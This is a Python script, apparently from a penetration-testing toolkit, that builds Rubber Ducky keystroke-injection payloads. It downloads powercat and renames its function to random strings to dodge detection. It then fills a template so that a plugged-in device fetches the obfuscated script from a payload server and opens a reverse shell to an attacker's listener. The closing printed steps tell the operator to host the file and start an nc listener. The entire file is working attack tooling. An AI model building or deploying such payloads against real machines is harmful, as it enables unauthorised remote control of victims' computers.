import argparse
import sys
import random
import string
import os

def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

shellListenerIP = "127.0.0.1"
shellListenerPort = 8001
payloadProviderIP = "127.0.0.1"
payloadProviderPort = 80

programepilog = "example usage: python3 " + sys.argv[0] + "-wr -l 192.168.1.10:8001 -pp 192.168.1.10:80"
programdescription = "Prepare rubber ducky scripts for physical engagments."
programdescription += " Tool made by H4. Creds for powercat go to https://github.com/besimorhino/powercat"
parser = argparse.ArgumentParser(description=programdescription, epilog=programepilog)
parser.add_argument("-s", "--setup", help="initial setup", action="store_true", required=False)
parser.add_argument("-wr", "--windowsReverse", help="creating an obfuscated Windows reverse shell", action="store_true", required=False)
parser.add_argument("-l", "--listener", help="IP and port of shell listener. Format: IP:PORT (needed for -wr option)", required=False, type=str)
parser.add_argument("-pp", "--payloadProvider", help="server which provides the obfuscated powercat version. Format: IP:PORT (needed for -wr option)", required=False, type=str)
args = parser.parse_args()

if args.setup:
    print("[#] 1. Downloading powercat (https://github.com/besimorhino/powercat) for Windows reverse shell payload...")
    os.system('curl -s https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 > resources/powercat.ps1')

if args.windowsReverse:
    obfuscatedFilename = get_random_string(8)
    obfuscatedFunction = get_random_string(8)

    if args.listener:
        shellListenerIP = args.listener.split(":")[0]
        shellListenerPort = args.listener.split(":")[1]
    
    if args.payloadProvider:
        payloadProviderIP = args.payloadProvider.split(":")[0]
        payloadProviderPort = args.payloadProvider.split(":")[1]

    print("")
    print("[#] Selected payload: Windows reverse shell")
    print("")
    print("[#] 1. Are all parameters correct?")
    print("[#]\tshell listener IP: " + shellListenerIP)
    print("[#]\tshell listener PORT: " + str(shellListenerPort))
    print("[#]\tpayload provider IP: " + payloadProviderIP)
    print("[#]\tpayload provider PORT: " + str(payloadProviderPort))
    parametersCorrect = input("[#] Y/N? ")
    if parametersCorrect != "Y":
        print("[-] Good bye!")
        print("")
        sys.exit(0)
    print("")

    print("[#] 2. Obfuscating powercat...")
    f = open("resources/powercat.ps1", "r")
    pcatContentLines = f.readlines()
    f.close()
    pcatContent = ""
    for line in pcatContentLines:
        if "function powercat" in line:
            line = line.replace("powercat", obfuscatedFunction)
        pcatContent += line
    f = open("resources/" + obfuscatedFilename + ".ps1", "w")
    f.write(pcatContent)
    f.close()
    print("")

    print("[#] 3. Creating ducky script payload...")
    f = open("templates/windows_reverse_shell.txt", "r")
    duckyScript = f.readlines()
    f.close()
    duckyScriptContent = ""
    for line in duckyScript:
        if "<PROVIDERIP>" in line:
            line = line.replace("<PROVIDERIP>", payloadProviderIP)
        if "<PROVIDERPORT>" in line:
            line = line.replace("<PROVIDERPORT>", payloadProviderPort)
        if "<POWERCATNAME>" in line:
            line = line.replace("<POWERCATNAME>", obfuscatedFilename)
        if "<POWERCATFUNCTION>" in line:
            line = line.replace("<POWERCATFUNCTION>", obfuscatedFunction)
        if "<SHELLIP>" in line:
            line = line.replace("<SHELLIP>", shellListenerIP)
        if "<SHELLPORT>" in line:
            line = line.replace("<SHELLPORT>", shellListenerPort)
        duckyScriptContent += line
    scriptFilename = obfuscatedFilename + obfuscatedFunction + "_windows_reverse_shell.txt"
    f = open("generated_scripts/" + scriptFilename, "w")
    f.write(duckyScriptContent)
    f.close()
    print("[+] Ducky script payload wrote to generated_scripts/" + scriptFilename) 
    print("")

    print("[#] Before you use the ducky script perform the following steps.")
    print("[#]\t1. Start a web server on " + payloadProviderIP + " to provide the obfuscated powercat script:")
    print("[#]\t\t- Copy " + obfuscatedFilename + ".ps1 to " + payloadProviderIP)
    print("[#]\t\t- In the same folder as " + obfuscatedFilename + ".ps1 start a web server: python3 -m http.server " + payloadProviderPort)
    print("[#]\t2. Start the shell listener on " + shellListenerIP + ":")
    print("[#]\t\t- Start nc -lvp " + shellListenerPort)
    print("")
    print("[+] Good bye! Have fun with the ducky script.")
